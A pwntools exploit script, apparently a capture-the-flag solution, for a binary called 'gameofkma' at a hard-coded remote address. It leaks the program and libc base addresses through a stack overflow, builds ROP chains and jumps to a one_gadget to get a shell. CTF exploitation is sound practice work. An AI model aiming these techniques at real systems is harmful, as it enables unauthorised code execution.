#!/usr/bin/python3

from pwn import *
from ctypes import*

exe = ELF('./gameofkma_patched', checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)
glibc = cdll.LoadLibrary(libc.path)
exe.sym['main'] = 0x1E8A
libc.sym['one_gadget'] = 0x10a2fc

context.binary = exe
context.log_level = 'info'

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote('45.77.248.50', 1337)

#################################
### Stage 1: Leak exe address ###
#################################
p.sendlineafter(b'(0-5)', b'5')
p.sendlineafter(b'(0-2)\n', b'2')

exe_leak = u64(p.recvline()[:-1] + b'\x00\x00')
exe.address = exe_leak - 0x1e8a
log.info(hex(exe_leak))
log.info(hex(exe.address))

p.sendlineafter(b'(0-2)\n', b'4')

ret = exe.address + 0x2413
pop_rdi = exe.address + 0x2483

# Ret again for stack alignment
payload = p32(18) + b'0'*8 + p64(ret)[:4]
p.sendafter(b'hero?\n', payload)
payload = b'1'*0xc + p64(ret)[4:]
p.sendafter(b'hero?\n', payload)
# Setup pop_rdi so don't need to setup later
payload = p32(19) + p64(exe.sym['main']) + p64(pop_rdi)[:4]
p.sendafter(b'hero?\n', payload)
payload = b'3'*0xc + p64(pop_rdi)[4:]
p.sendafter(b'hero?\n', payload)

glibc.srand(0x1337)
for i in range(7):
    p.recvuntil(b'(1/0)\n')
    p.sendline(b'1')
    p.sendlineafter(b'> ', str(glibc.rand() % 2022).encode())

##################################
### Stage 2: Leak libc address ###
##################################
p.sendlineafter(b'(0-5)', b'5')
p.sendlineafter(b'(0-2)\n', b'2')
p.sendlineafter(b'(0-2)\n', b'4')

# We already have pop_rdi, just add puts@got and print out
payload = p32(19) + p64(exe.got['puts']) + p64(exe.plt['puts'])[:4]
p.sendafter(b'hero?\n', payload)
payload = b'1'*0xc + p64(exe.plt['puts'])[4:]
p.sendafter(b'hero?\n', payload)
payload = p32(20) + p64(exe.sym['main']) + b'2'*0x4
p.sendafter(b'hero?\n', payload)
payload = b'3'*0x10
p.sendafter(b'hero?\n', payload)

glibc.srand(0x1337)
for i in range(7):
    p.recvuntil(b'(1/0)\n')
    p.sendline(b'1')
    p.sendlineafter(b'> ', str(glibc.rand() % 2022).encode())
p.recvuntil('========== 𝗕𝗬𝗘 ==========\n'.encode())
puts_addr = u64(p.recv(6) + b'\x00\x00')
libc.address = puts_addr - libc.sym['puts']
log.info("Libc leak: " + hex(puts_addr))
log.info("Libc base: " + hex(libc.address))

###########################
### Stage 3: One gadget ###
###########################
p.sendlineafter(b'(0-5)', b'5')
p.sendlineafter(b'(0-2)\n', b'2')
p.sendlineafter(b'(0-2)\n', b'4')

payload = p32(18) + b'1'*8 + p64(libc.sym['one_gadget'])[:4]
p.sendafter(b'hero?\n', payload)
payload = b'1'*0xc + p64(libc.sym['one_gadget'])[4:]
p.sendafter(b'hero?\n', payload)
payload = p32(20) + p64(exe.sym['main']) + b'2'*0x4
p.sendafter(b'hero?\n', payload)
payload = b'3'*0x10
p.sendafter(b'hero?\n', payload)

glibc.srand(0x1337)
for i in range(7):
    p.recvuntil(b'(1/0)\n')
    p.sendline(b'1')
    p.sendlineafter(b'> ', str(glibc.rand() % 2022).encode())

p.interactive()